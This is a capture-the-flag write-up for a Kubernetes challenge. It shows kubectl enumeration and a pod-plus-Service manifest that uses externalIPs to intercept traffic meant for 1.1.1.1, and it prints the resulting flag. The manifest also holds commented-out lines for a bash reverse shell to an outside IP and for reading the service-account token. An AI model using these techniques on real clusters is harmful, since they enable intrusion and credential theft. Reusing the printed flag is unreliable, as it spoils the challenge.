# Hungry Helmsman
Welcome, chefs of the Kubernetes kitchen! The hungry Helmsman is on the lookout for a unique feast, and his palate is set on flags. Embark on the "Hungry Helmsman" challenge, where Kubernetes prowess meets culinary finesse. Craft the ultimate deployment to reveal the flag!

# Solution
```bash
nc challenge10.play.potluckctf.com 8888
```

Save content of the kubeconfig file in `HungryHelmsman.yaml` and start checking cluster:
```bash
kubectl --kubeconfig HungryHelmsman.yaml get all --all-namespaces
kubectl --kubeconfig HungryHelmsman.yaml get namespaces
kubectl --kubeconfig HungryHelmsman.yaml auth can-i --list -n flag-sender
kubectl --kubeconfig HungryHelmsman.yaml auth can-i --list -n flag-reciver
kubectl --kubeconfig HungryHelmsman.yaml describe pod/flag-sender-676776d678-pcpbx -n flag-sender
```

By output we can see we can create pod and service in `flag-reciver` namespace. We also see the flag is send each 10s to 1.1.1.1:80.
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: shell
  labels:
    app.kubernetes.io/name: shell
spec:
  containers:
  - name: shell
    image: nginxinc/nginx-unprivileged
    # command: ["/bin/bash", "-c", "bash -i >& /dev/tcp/185.41.69.21/1337 0>&1"]
    # command: ["cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"]
    resources:
      limits:
        cpu: "100m"
        memory: "50M"
      requests:
        cpu: "50m"
        memory: "25M"
    securityContext:
      allowPrivilegeEscalation: false
      runAsNonRoot: true
      capabilities:
        drop: ["ALL"]
      seccompProfile:
        type: RuntimeDefault
---
apiVersion: v1
kind: Service
metadata:
  name: service
spec:
  externalIPs:
    - 1.1.1.1
  selector:
    app.kubernetes.io/name: shell
  ports:
    - protocol: TCP
      port: 80
      targetPort: 8080
```

Above code creates pod and redirect by using service all traffic to 1.1.1.1 to this pod.
```bash
kubectl --kubeconfig HungryHelmsman.yaml apply -f shell.yaml -n flag-reciever
kubectl --kubeconfig HungryHelmsman.yaml logs -f pod/shell -n flag-reciever
```

# Flag
`potluck{kubernetes_can_be_a_bit_weird}`

# Hashtags
#kubernetes #kubectl